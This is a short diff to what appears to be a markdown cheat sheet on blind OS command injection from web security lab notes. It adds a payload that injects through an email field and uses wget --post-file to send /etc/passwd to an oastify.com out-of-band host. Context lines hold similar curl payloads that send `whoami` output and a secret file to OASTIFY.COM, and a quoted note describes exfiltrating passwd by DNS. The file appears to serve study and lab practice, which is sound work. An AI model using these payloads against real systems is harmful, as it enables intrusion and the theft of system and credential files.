@@ -4609,7 +4609,13 @@ email=carlos@exam.net||curl+`whoami`.OASTIFY.COM||
 
 ```
 ||$(curl $(cat /home/carlos/secret).OASTIFY.COM)||
-```  
+```
+
+or
+
+```
+(blind) email=x@gmail.com|wget http://9z9cmpn8hpnytcir6l8dfeod94fv3mrb.oastify.com --post-file=/etc/passwd|
+``` 
 
 >In this YouTube video [Leet Cipher](https://youtu.be/o7oVWXw4t5E) show how to use DNS rebinding with blind command injection to exfiltration the contents of `passwd` from the target by first uploading bash script that Base64 and then Base58 encode the `passwd` file content, to strip special character not able to ex-filtrate with DNS label restrictions.  
 
